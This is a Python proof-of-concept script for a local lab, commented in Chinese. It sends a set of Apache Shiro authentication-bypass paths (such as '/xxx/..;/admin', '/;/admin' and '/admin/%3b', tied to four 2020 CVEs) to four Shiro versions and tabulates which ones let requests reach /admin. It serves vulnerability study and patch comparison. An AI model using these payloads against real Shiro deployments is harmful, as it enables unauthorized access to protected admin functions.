#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
路径绕过版本对照：同一批 payload 打四个 Shiro 版本，看谁还漏。

四个 CVE 的修复时间线：
    CVE-2020-1957   < 1.5.2    /xxx/..;/admin        Shiro 与 Spring 对 ; 的解析不一致
    CVE-2020-11989  < 1.5.3    /;/admin              同上的变体
    CVE-2020-13933  < 1.6.0    /admin/%3b            URL 编码分号绕过
    CVE-2020-17523  < 1.7.1    /admin/%20            尾部空格

四个版本各补一刀：1.4.2 全漏 → 1.5.2 少一个 → 1.6.0 再少一个 → 1.7.1 封完。
这个靶场就是让你把"补丁怎么一步步堵上"亲眼跑一遍，而不是背 CVE 编号。

判定方式：
    200 + 出现 FLAG{  → 绕过了，请求真的进了 /admin
    302               → 被 Shiro 的 authc 过滤器拦住，跳 /login
    其它              → 目标自己报错（Tomcat 拒绝畸形路径之类）

用法：
    python3 poc/bypass_exp.py
    python3 poc/bypass_exp.py --host 127.0.0.1
"""

import argparse
import http.client

# 端口 → 版本，和 compose.yml 里的映射保持一致
TARGETS = [
    (8903, "1.4.2"),
    (8904, "1.5.2"),
    (8905, "1.6.0"),
    (8906, "1.7.1"),
]

# (payload, 说明, 归属的 CVE)
PAYLOADS = [
    ("/admin",            "基线：什么都不改",            "-"),
    ("/admin/",           "尾斜杠",                      "-"),
    ("/xxx/..;/admin",    "经典 1957：多一层再回退",      "1957"),
    ("/xxx/..;/admin/",   "1957 + 尾斜杠",               "1957"),
    ("/;/admin",          "路径里塞一个空段",             "11989"),
    ("/;/admin/",         "同上 + 尾斜杠",               "11989"),
    ("/admin/%3b",        "URL 编码的分号",              "13933"),
    ("/admin%3b",         "无斜杠编码分号",              "13933"),
    ("/admin/%3b/",       "编码分号 + 尾斜杠",           "13933"),
    ("/admin/%20",        "URL 编码的尾随空格",          "17523"),
    ("/admin/%20/",       "编码空格 + 尾斜杠",           "17523"),
    ("//admin",           "双斜杠",                      "?"),
    ("/./admin",          "点段",                        "?"),
    ("/admin/.",          "尾点",                        "?"),
    ("/admin/..;/",       "回绕到根",                    "?"),
    ("/admin;/",          "裸分号",                      "?"),
]


def probe(host, port, path):
    conn = http.client.HTTPConnection(host, port, timeout=6)
    try:
        conn.request("GET", path, headers={"Connection": "close"})
        r = conn.getresponse()
        body = r.read(4096).decode("utf-8", "replace")
        return r.status, body
    except Exception as e:
        return 0, str(e)
    finally:
        try:
            conn.close()
        except Exception:
            pass


def verdict(status, body):
    if status == 0:
        return "ERR"
    if status == 200 and "FLAG{" in body:
        return "BYPASS"
    if status in (301, 302, 303, 307):
        return "302"
    if status == 200:
        return "200"
    return str(status)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    args = ap.parse_args()

    # 先确认端口都活着，避免只起来一个就开始跑
    alive = []
    for port, ver in TARGETS:
        st, _ = probe(args.host, port, "/")
        if st == 0:
            print("[!] %d (%s) 连不上，跳过" % (port, ver))
        else:
            alive.append((port, ver))
    if not alive:
        raise SystemExit("[x] 一个端口都不通，先起靶场：docker compose up -d shiro-bypass")

    width = max(len(p) for p, _, _ in PAYLOADS) + 2
    head = "  %-*s %-6s" % (width, "payload", "cve")
    for _, ver in alive:
        head += " %-9s" % ver
    print(head)
    print("  " + "-" * (len(head) - 2))

    hits = {}
    for path, desc, cve in PAYLOADS:
        line = "  %-*s %-6s" % (width, path, cve)
        for port, ver in alive:
            st, body = probe(args.host, port, path)
            v = verdict(st, body)
            line += " %-9s" % v
            if v == "BYPASS":
                hits.setdefault(ver, []).append(path)
        print(line)

    print()
    if hits:
        for ver in sorted(hits):
            print("[+] %s 可以绕过：%s" % (ver, "  ".join(hits[ver])))
    else:
        print("[!] 一个都没绕过。检查服务是否正常，或者 payload 需要调整。")
    print("\n提示：BYPASS = 200 且拿到 flag；302 = 被 authc 拦住。")


if __name__ == "__main__":
    main()
